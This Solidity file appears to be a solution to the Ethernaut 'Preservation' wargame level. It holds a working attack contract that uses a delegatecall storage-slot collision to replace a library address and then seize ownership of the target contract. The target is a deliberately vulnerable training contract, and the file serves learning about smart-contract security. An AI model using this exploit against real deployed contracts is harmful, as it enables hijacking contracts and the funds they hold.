// SPDX-License-Identifier: MIT
/*This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
Understanding what it means for delegatecall to be context-preserving.
Understanding how storage variables are stored and accessed.
Understanding how casting works between different data types.*/
pragma solidity ^0.8.0;

interface Preservation {
     function setFirstTime(uint256 _timeStamp) external;
}
contract PreservationAttack{
    /*    //Attack strategy
    1. Call Preservation from thecontract
    2. Call SetTime and modigy storage 0 with our contract address
    3. Call again SetTime but this time delegate call will call our setTime which will change owner
    

    */
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    address public addressToAttack;
    Preservation preservation;


    constructor (address _addressToAttack){
        addressToAttack = _addressToAttack;
        preservation = Preservation(addressToAttack);
    }
    
    function setTime(uint256 _time) public {
        owner = tx.origin;
    }

    function attack() public{
        //First we call the preservation from the contract
        //We call the setTime, and we pass the address of this contract
        preservation.setFirstTime(uint256(uint160(address(this))));

        //Step 3 call now preservation but with our contract address as target 
        preservation.setFirstTime(0);
    }
}

